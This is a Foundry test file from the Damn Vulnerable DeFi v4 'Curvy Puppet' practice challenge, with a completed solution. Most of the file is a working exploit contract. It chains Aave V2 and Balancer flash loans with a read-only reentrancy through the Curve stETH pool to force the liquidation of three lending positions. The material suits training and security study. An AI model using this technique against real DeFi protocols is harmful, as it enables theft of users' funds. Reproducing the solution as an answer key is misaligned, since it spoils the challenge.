// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

interface ICurveStETH is IStableSwap {
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount)
        external
        payable
        returns (uint256);

    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts)
        external
        returns (uint256[2] memory);

    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy)
        external
        payable
        returns (uint256);
}

interface IAaveV2Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract CurvyPuppetExploit {
    IAaveV2Pool constant AAVE_V2 =
        IAaveV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IBalancerVault constant BALANCER =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    ICurveStETH immutable curvePool;
    CurvyPuppetLending immutable lending;
    IPermit2 immutable permit2;
    IERC20 immutable lpToken;
    IERC20 immutable stETH;
    WETH immutable weth;
    DamnValuableToken immutable dvt;
    address immutable treasury;

    address[3] victims;

    constructor(
        ICurveStETH _curvePool,
        CurvyPuppetLending _lending,
        IPermit2 _permit2,
        IERC20 _lpToken,
        IERC20 _stETH,
        WETH _weth,
        DamnValuableToken _dvt,
        address _treasury,
        address[3] memory _victims
    ) {
        curvePool = _curvePool;
        lending = _lending;
        permit2 = _permit2;
        lpToken = _lpToken;
        stETH = _stETH;
        weth = _weth;
        dvt = _dvt;
        treasury = _treasury;
        victims = _victims;
    }

    function attack() external {
        lpToken.approve(address(permit2), type(uint256).max);

        permit2.approve({
            token: address(lpToken),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: type(uint48).max
        });

        stETH.approve(address(AAVE_V2), type(uint256).max);
        weth.approve(address(AAVE_V2), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172_000e18; // stETH
        amounts[1] = 20_500e18;  // WETH

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        AAVE_V2.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );

        weth.transfer(treasury, weth.balanceOf(address(this)));
        lpToken.transfer(treasury, lpToken.balanceOf(address(this)));
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37_991 ether;

        BALANCER.flashLoan(address(this), tokens, amounts, "");

        return true;
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        _addLiquidity();
        _removeLiquidityAndTriggerReentrancy();

        // Repay Balancer WETH flash loan
        weth.deposit{value: 37_991 ether}();
        weth.transfer(address(BALANCER), 37_991 ether);

        // Convert ETH to stETH so Aave can pull stETH repayment
        uint256 ethToSwap = 12_963_923_469_069_977_697_655;
        curvePool.exchange{value: ethToSwap}(0, 1, ethToSwap, 1);

        // Convert ETH to WETH so Aave can pull WETH repayment
        weth.deposit{value: 20_518 ether}();
    }

    function _addLiquidity() private {
        weth.withdraw(58_685 ether);

        stETH.approve(address(curvePool), type(uint256).max);

        uint256[2] memory amounts;
        amounts[0] = 58_685 ether;
        amounts[1] = stETH.balanceOf(address(this));

        curvePool.add_liquidity{value: 58_685 ether}(amounts, 0);
    }

    function _removeLiquidityAndTriggerReentrancy() private {
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];

        uint256 lpBalance = lpToken.balanceOf(address(this));

        // Leave ~3 LP tokens for the 3 liquidations.
        curvePool.remove_liquidity(lpBalance - (3e18 + 1), minAmounts);
    }

    receive() external payable {
        if (msg.sender == address(curvePool)) {
            for (uint256 i = 0; i < victims.length; i++) {
                lending.liquidate(victims[i]);
            }
        }
    }
}

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        IERC20 lpToken = IERC20(curvePool.lp_token());
    
        address[3] memory victims = [alice, bob, charlie];
    
        CurvyPuppetExploit exploit = new CurvyPuppetExploit(
            ICurveStETH(address(curvePool)),
            lending,
            permit2,
            lpToken,
            stETH,
            weth,
            dvt,
            treasury,
            victims
        );
    
        lpToken.transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
    
        exploit.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}
